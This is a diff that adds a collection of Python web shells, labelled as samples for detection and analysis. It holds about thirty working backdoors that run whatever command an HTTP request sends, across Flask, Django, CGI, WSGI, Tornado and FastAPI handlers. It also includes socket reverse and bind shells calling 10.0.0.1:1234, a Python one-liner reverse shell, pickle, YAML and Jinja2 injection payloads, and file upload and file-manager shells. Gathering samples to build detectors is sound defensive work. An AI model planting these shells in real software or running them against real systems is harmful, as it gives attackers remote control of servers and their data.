@@ -1,0 +1,248 @@
+# Python Web Shells
+# Python web shell samples for detection and analysis
+
+# Basic Python Shell
+import os; os.system(request.args.get('cmd'))
+
+# Flask Shell
+from flask import Flask, request
+import os
+app = Flask(__name__)
+@app.route('/')
+def shell():
+    return os.popen(request.args.get('cmd')).read()
+
+# Django Shell
+from django.http import HttpResponse
+import os
+def shell(request):
+    return HttpResponse(os.popen(request.GET.get('cmd')).read())
+
+# Python CGI Shell
+#!/usr/bin/env python
+import cgi
+import os
+form = cgi.FieldStorage()
+cmd = form.getvalue('cmd')
+print("Content-Type: text/html\n")
+print(os.popen(cmd).read())
+
+# Python Subprocess Shell
+import subprocess
+import sys
+cmd = sys.argv[1] if len(sys.argv) > 1 else 'whoami'
+result = subprocess.check_output(cmd, shell=True)
+print(result.decode())
+
+# Python Eval Shell
+eval(input())
+exec(input())
+
+# Python Reverse Shell
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.0.0.1",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+
+# Python Bind Shell
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.bind(("0.0.0.0",1234))
+s.listen(1)
+conn,addr=s.accept()
+os.dup2(conn.fileno(),0)
+os.dup2(conn.fileno(),1)
+os.dup2(conn.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+
+# Python One-liner Reverse Shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Python Base64 Shell
+import base64
+import os
+cmd = base64.b64decode('d2hvYW1p').decode()
+os.system(cmd)
+
+# Python Pickle Shell
+import pickle
+import os
+class Shell:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+pickle.loads(pickle.dumps(Shell()))
+
+# Python YAML Shell
+import yaml
+yaml.load("!!python/object/apply:os.system ['whoami']")
+
+# Python Template Shell (Jinja2)
+from jinja2 import Template
+tmpl = Template("{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate() }}")
+print(tmpl.render())
+
+# Python File Upload Shell
+from flask import Flask, request
+app = Flask(__name__)
+@app.route('/upload', methods=['POST'])
+def upload():
+    file = request.files['file']
+    file.save(file.filename)
+    return 'OK'
+
+# Python File Manager Shell
+from flask import Flask, request
+import os
+app = Flask(__name__)
+@app.route('/files')
+def files():
+    path = request.args.get('path', '.')
+    return str(os.listdir(path))
+@app.route('/read')
+def read():
+    file = request.args.get('file')
+    return open(file).read()
+@app.route('/write', methods=['POST'])
+def write():
+    file = request.form.get('file')
+    content = request.form.get('content')
+    open(file, 'w').write(content)
+    return 'OK'
+
+# Python Database Shell
+import sqlite3
+import sys
+conn = sqlite3.connect('database.db')
+cursor = conn.cursor()
+cursor.execute(sys.argv[1])
+print(cursor.fetchall())
+
+# Python Obfuscated Shell
+__import__('os').system(__import__('sys').argv[1])
+
+# Python Lambda Shell
+(lambda: __import__('os').system('whoami'))()
+
+# Python Comprehension Shell
+[__import__('os').system('whoami') for _ in [1]]
+
+# Python Decorator Shell
+@eval
+@input
+def shell():
+    pass
+
+# Python Metaclass Shell
+class Meta(type):
+    def __new__(cls, name, bases, attrs):
+        __import__('os').system('whoami')
+        return super().__new__(cls, name, bases, attrs)
+class Shell(metaclass=Meta):
+    pass
+
+# Python Property Shell
+class Shell:
+    @property
+    def cmd(self):
+        return __import__('os').system('whoami')
+Shell().cmd
+
+# Python Descriptor Shell
+class Shell:
+    def __get__(self, obj, objtype=None):
+        __import__('os').system('whoami')
+class Exploit:
+    shell = Shell()
+Exploit().shell
+
+# Python Context Manager Shell
+class Shell:
+    def __enter__(self):
+        __import__('os').system('whoami')
+    def __exit__(self, *args):
+        pass
+with Shell():
+    pass
+
+# Python Iterator Shell
+class Shell:
+    def __iter__(self):
+        __import__('os').system('whoami')
+        return self
+    def __next__(self):
+        raise StopIteration
+for _ in Shell():
+    pass
+
+# Python Generator Shell
+def shell():
+    __import__('os').system('whoami')
+    yield
+list(shell())
+
+# Python Asyncio Shell
+import asyncio
+async def shell():
+    __import__('os').system('whoami')
+asyncio.run(shell())
+
+# Python Threading Shell
+import threading
+threading.Thread(target=lambda: __import__('os').system('whoami')).start()
+
+# Python Multiprocessing Shell
+import multiprocessing
+multiprocessing.Process(target=lambda: __import__('os').system('whoami')).start()
+
+# Python Socket Server Shell
+import socket
+s = socket.socket()
+s.bind(('0.0.0.0', 1234))
+s.listen(1)
+while True:
+    conn, addr = s.accept()
+    cmd = conn.recv(1024).decode()
+    result = __import__('os').popen(cmd).read()
+    conn.send(result.encode())
+
+# Python HTTP Server Shell
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import os
+class Shell(BaseHTTPRequestHandler):
+    def do_GET(self):
+        cmd = self.path[1:]
+        result = os.popen(cmd).read()
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(result.encode())
+HTTPServer(('0.0.0.0', 8080), Shell).serve_forever()
+
+# Python WSGI Shell
+def application(environ, start_response):
+    import os
+    cmd = environ.get('QUERY_STRING', 'whoami')
+    result = os.popen(cmd).read()
+    start_response('200 OK', [('Content-Type', 'text/plain')])
+    return [result.encode()]
+
+# Python Tornado Shell
+import tornado.ioloop
+import tornado.web
+import os
+class Shell(tornado.web.RequestHandler):
+    def get(self):
+        cmd = self.get_argument('cmd', 'whoami')
+        self.write(os.popen(cmd).read())
+tornado.web.Application([(r"/", Shell)]).listen(8080)
+tornado.ioloop.IOLoop.current().start()
+
+# Python FastAPI Shell
+from fastapi import FastAPI
+import os
+app = FastAPI()
+@app.get("/")
+def shell(cmd: str = "whoami"):
+    return os.popen(cmd).read()
